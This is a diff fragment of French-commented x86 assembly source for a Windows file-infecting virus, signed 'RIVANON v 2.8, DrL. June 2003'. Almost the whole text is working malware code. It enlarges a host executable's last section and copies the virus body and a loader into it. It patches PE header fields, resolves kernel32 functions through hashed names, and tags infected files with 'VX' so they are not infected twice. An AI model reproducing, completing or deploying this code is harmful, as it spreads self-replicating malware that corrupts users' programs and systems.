+mov edi,[adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp]
+push edi
+mov eax,sizeof.IMAGE_DATA_DIRECTORY
+mov ecx,11
+mul ecx
+lea edi,[edi+eax+sizeof.IMAGE_OPTIONAL_HEADER]
+xor eax,eax
+stosd
+stosd
+
+;[Fin de la destruction]
+
+;[On en profite au passage pour changer la valeur de OH_FileAlignment qui n'
+;est pas obligatoirement 200h (mais est un multiple de 200h), on impose la
+;valeur 200h]:
+
+pop edi
+mov dword [edi.OH_FileAlignment],200h
+popad
+
+;[Fin de la modification de OH_FileAlignment]
+
+
+
+
+;[Debut de la construction de la "table des call"]:
+
+sub eax,[adr_image_base+ebp]
+stdcall rva_vers_adr_map,eax
+mov [adr_map_loader_sect_code_cible+ebp],eax
+
+pop ecx
+mov edi,esi
+add esi,ecx
+lea esi,[esi+4*ecx]
+
+element_suivant_table_call:
+mov al,0e8h
+stosb
+mov eax,esi
+sub eax,edi
+sub eax,4
+stosd
+loop element_suivant_table_call
+
+;[Fin de la construction de la "table des call"]
+
+;[Debut de la routine de transfert des deux parties du virus]:
+
+mov esi,[adr_map_IMAGE_FILE_HEADER_cible+ebp]
+
+movzx ecx,word [esi.FH_NumberOfSections]
+dec ecx
+
+
+mov eax,sizeof.IMAGE_SECTION_HEADER
+mul ecx
+mov esi,[adr_map_IMAGE_SECTION_HEADER_cible+ebp]
+lea esi,[esi+eax]
+
+lea edx,[esi.SH_SizeOfRawData]
+
+mov ecx,dword [edx]
+
+add dword [edx],TAILLE_VIRUS_ALIGNE_FICHIER
+add dword [esi.SH_VirtualSize],TAILLE_VIRUS_ALIGNE_MEMOIRE
+
+call aligne
+
+mov edx,[adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp]
+add dword [edx.OH_SizeOfImage],TAILLE_VIRUS_ALIGNE_MEMOIRE
+
+mov edx,dword [esi.SH_PointerToRawData]
+
+add edx,ecx
+
+add edx,dword [adr_map_cible+ebp]
+
+stdcall adr_map_vers_rva,edx
+add eax,[adr_image_base+ebp]
+
+
+mov [adr_fin_derniere_sect_hote+ebp],eax
+
+mov edi,[adr_map_loader_sect_code_cible+ebp]
+lea esi,[debut_loader+ebp]
+cld
+mov ecx,TAILLE_LOADER
+rep movsb
+
+mov ebx,[ptr1_mem_alloc_sect_data_hote+ebp]
+
+mov eax,[ptr2_mem_alloc_sect_data_hote+ebp]
+mov [ptr1_mem_alloc_sect_data_hote+ebp],eax
+
+lea esi,[debut_virus+ebp]
+mov edi,edx
+mov ecx,TAILLE_VIRUS
+rep movsb
+
+mov [ptr1_mem_alloc_sect_data_hote+ebp],ebx
+
+;on marque la cible pour ne pas la reinfecter
+mov edi,[adr_map_cible+ebp]
+lea edi,[edi.MZ_csum]
+mov ax,'VX'
+stosw
+
+;[Fin de la routine de transfert des deux parties du virus]
+
+jmp sortie_infection
+
+err_infection:
+lea edi,[struct_recherche+ebp]
+
+sub dword [edi.WFD_nFileSizeLow],TAILLE_VIRUS_ALIGNE_FICHIER
+
+
+;[Debut de la restitution a l'O.S et de la fermeture du fichier cible]:
+
+sortie_infection:
+
+lea edi,[struct_recherche+ebp]
+stdcall [UnmapViewOfFile+ebp],[adr_map_cible+ebp]
+
+stdcall [CloseHandle+ebp],[handle_map_cible+ebp]
+
+xor ebx,ebx
+stdcall [SetFilePointer+ebp],[handle_fichier_cible+ebp],\
+dword [edi.WFD_nFileSizeLow],ebx,ebx
+
+stdcall [SetEndOfFile+ebp],[handle_fichier_cible+ebp]
+
+stdcall [CloseHandle+ebp],[handle_fichier_cible+ebp]
+
+;[Fin de la fermeture du fichier cible]
+
+popad
+ret
+
+;[Fin de la fonction infectieuse]
+
+
+
+
+;[Debut de la fonction de recopie d'une chaine de caracteres terminee par 0]:
+copie_chaine:
+
+pushad
+octet_suivant:
+lodsb
+stosb		;meme le 0 final de la chaine est recopie
+cmp al,0
+jnz octet_suivant
+popad
+ret
+
+;[Fin de la fonction de recopie]
+
+;[Debut de la fonction de conversion d'une RVA en une adresse dans le fichier
+;image memoire]:
+
+rva_vers_adr_map:
+
+pop eax
+xchg eax,[esp]
+pushad
+;mov ebx,dword [esp+36]
+mov edx,[adr_map_IMAGE_FILE_HEADER_cible+ebp]
+movzx ecx,word [edx.FH_NumberOfSections]
+
+mov esi,[adr_map_IMAGE_SECTION_HEADER_cible+ebp]
+
+cherche_section_par_rva:
+cmp dword [esi.SH_VirtualAddress],eax
+ja rva_localise
+add esi,sizeof.IMAGE_SECTION_HEADER
+loop cherche_section_par_rva
+
+rva_localise:
+sub esi,sizeof.IMAGE_SECTION_HEADER
+sub eax,dword [esi.SH_VirtualAddress]
+add eax,dword [esi.SH_PointerToRawData]
+add eax,[adr_map_cible+ebp]
+mov dword [esp+28],eax
+popad
+ret
+
+
+;[Fin de la fonction de conversion d'une RVA]
+
+
+;[Debut de la fonction de conversion d'une adresse dans l'image memoire
+;d'un fichier en une RVA]:
+
+adr_map_vers_rva:
+pop eax
+xchg eax,[esp]
+pushad
+sub eax,[adr_map_cible+ebp]
+mov edx,[adr_map_IMAGE_FILE_HEADER_cible+ebp]
+movzx ecx,word [edx.FH_NumberOfSections]
+
+mov esi,[adr_map_IMAGE_SECTION_HEADER_cible+ebp]
+
+cherche_section:
+cmp dword [esi.SH_PointerToRawData],eax
+ja section_trouve
+add esi,sizeof.IMAGE_SECTION_HEADER
+loop cherche_section
+
+section_trouve:
+sub esi,sizeof.IMAGE_SECTION_HEADER
+sub eax,dword [esi.SH_PointerToRawData]
+add eax,dword [esi.SH_VirtualAddress]
+mov dword [esp+28],eax
+popad
+ret
+
+;[Fin de la fonction de conversion d'une adresse de l'image memoire
+;d'un fichier]
+
+
+;[Debut de la fonction d'alignement des champs taille d'une section]:
+
+aligne:
+
+;les champs taille de la section sur laquelle pointe esi sont alignes
+
+pushad
+
+mov edi,[adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp]
+
+;alignement memoire
+mov ebx,dword [edi.OH_SectionAlignment]
+dec ebx
+xor edx,edx
+lea ecx,[esi.SH_VirtualSize]
+mov eax,[ecx]
+add eax,ebx
+inc ebx
+div ebx
+mul ebx
+mov [ecx],eax
+
+;alignement fichier
+
+mov ebx,dword [edi.OH_FileAlignment]
+dec ebx
+lea ecx,[esi.SH_SizeOfRawData]
+mov eax,[ecx]
+add eax,ebx
+inc ebx
+div ebx
+mul ebx
+mov [ecx],eax
+popad
+ret
+
+;[Fin de la fonction d'alignement]
+
+
+;[Debut du code du loader du virus]:
+
+debut_loader:
+pushad
+db 0a1H		;mov eax,[<adr>]
+ptr2_mem_alloc_sect_data_hote dd ?
+push eax
+test eax,eax
+jnz exit_loader
+pop eax
+push 8000
+push GPTR
+db 0ffh,15h	;call [<adr>] appel a GlobalAlloc en fait
+ptr2_adr_globalalloc dd ?
+push eax
+mov edi,eax
+mov ecx,TAILLE_VIRUS
+db 0beh		;mov esi,adr
+adr_fin_derniere_sect_hote dd ?
+cld
+rep movsb
+exit_loader:
+ret
+TAILLE_LOADER=$-debut_loader
+
+;[Fin du code du loader]
+
+;zone de donnees qui vont etre greffees au programme cible:
+
+adr_espace_libre_sect_code_cible		dd __ExitProcess
+adr_espace_libre_sect_code_hote			dd 0
+adr_image_base					dd ADR_BASE
+rva_orig_1st_thunk_avant_infection_hote		dd RVA ID_OriginalFirstThunk_k32
+index_fct_k32_altere_hote			dd 0
+sz_nom_fct_k32_altere_hote			db 'ExitProcess'
+rb 30
+sz_type_extension_fichier_cible			db NOM_FICHIER_RECHERCHE
+sz_nom_globalalloc				db 'GlobalAlloc',0
+signature					db 'RIVANON v 2.8, DrL. June 2003'
+
+;Les deux tables qui suivent doivent etre collees l'une a l'autre et l'ordre des elements
+;de ces tables respecte.
+
+tab_condense:
+
+dd 0fdbe9ddfh		;CloseHandle
+dd 04b00fba1h		;CreateFileA
+dd 00d6ea22eh		;CreateFileMappingA
+dd 0be307c51h		;CreateThread
+dd 0be7b8631h		;FindClose
+dd 0c915738fh		;FindFirstFileA
+dd 08851f43dh		;FindNextFileA
+dd 040bf2f84h		;GetProcAddress
+dd 032beddc3h		;MapViewOfFile
+dd 0bc738ae6h		;SetEndOfFile
+dd 06d452a3ah		;SetFilePointer
+dd 03a00e23bh		;Sleep
+dd 0fae00d65h		;UnmapViewOfFile
+dd 04e5de044h		;ExitThread
+
+NBRE_FCT_K32_VIRUS=($-tab_condense)/4
+TAILLE_VIRUS=$-debut_virus
+TAILLE_VIRUS_ALIGNE_FICHIER=200h*((TAILLE_VIRUS+1ffh)/200h)
+TAILLE_VIRUS_ALIGNE_MEMOIRE=1000h*((TAILLE_VIRUS+0fffh)/1000h)
+
+
+;[Fin du virus]
+
+tab_adr_fct_k32_virus:
+CloseHandle								dd 0
+CreateFileA								dd 0
+CreateFileMappingA							dd 0
+CreateThread								dd 0
+FindClose								dd 0
+FindFirstFileA								dd 0
+FindNextFileA								dd 0
+GetProcAddress								dd 0
+MapViewOfFile								dd 0
+SetEndOfFile								dd 0
+SetFilePointer								dd 0
+Sleep									dd 0
+UnmapViewOfFile								dd 0
+ExitThread								dd 0
+
+
+condense								dd ?
+adr_map_IMAGE_OPTIONAL_HEADER_cible					dd ?
+adr_map_IMAGE_SECTION_HEADER_cible					dd ?
+adr_map_IMAGE_FILE_HEADER_cible						dd ?
+adr_map_IMAGE_IMPORT_DESCRIPTOR_cible					dd ?
+rva_IMAGE_IMPORT_DESCRIPTOR_cible					dd ?
+rva_IMAGE_IMPORT_BY_NAME_cible						dd ?
+adr_map_cible								dd ?
+thread_id								dd ?
+handle_fichier_cible							dd ?
+handle_map_cible							dd ?
+nbre_octet_libre_sect_code_cible					dd ?
+adr_map_espace_libre_sect_code_cible					dd ?
+adr_map_espace_libre_sect_data_cible					dd ?
+adr_map_1st_thunk_k32_cible						dd ?
+adr_map_original_1st_thunk_k32_cible					dd ?
+index_tab_image_import_by_name_k32_cible				dd ?
+nbre_fct_k32_cible							dd ?
+adr_map_loader_sect_code_cible						dd ?
+
+struct_recherche rb sizeof.WIN32_FIND_DATA
+
+tab_adr_fct_k32_hote:
+rd 2		;pour la generation 0
+
+
+
+section 'idata' import data readable writeable
+
+;IMAGE_IMPORT_DESCRIPTOR:
+dd RVA ID_OriginalFirstThunk_k32,0,0,RVA ID_Name_k32,RVA ID_FirstThunk_k32
+dd RVA ID_OriginalFirstThunk_u32,0,0,RVA ID_Name_u32,RVA ID_FirstThunk_u32
+dd 0,0,0,0,0
+
+ID_Name_k32	db 'KERNEL32.DLL',0
+ID_Name_u32	db 'USER32.DLL',0
+
+ID_OriginalFirstThunk_k32	dd RVA image_import_by_name_k32_01
+				dd RVA image_import_by_name_k32_02
+				dd 0
+
+ID_FirstThunk_k32:
+ExitProcess			dd RVA image_import_by_name_k32_01
+_Sleep				dd RVA image_import_by_name_k32_02
+				dd 0
+
+ID_OriginalFirstThunk_u32	dd RVA image_import_by_name_u32
+				dd 0
+ID_FirstThunk_u32:
+MessageBoxA			dd RVA image_import_by_name_u32
+				dd 0
+
+;IMAGE_IMPORT_BY_NAME:
+image_import_by_name_k32_01	dw 0
+				db 'ExitProcess',0
+image_import_by_name_k32_02	dw 0
+				db 'Sleep',0
+
+image_import_by_name_u32	dw 0
+				db 'MessageBoxA',0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
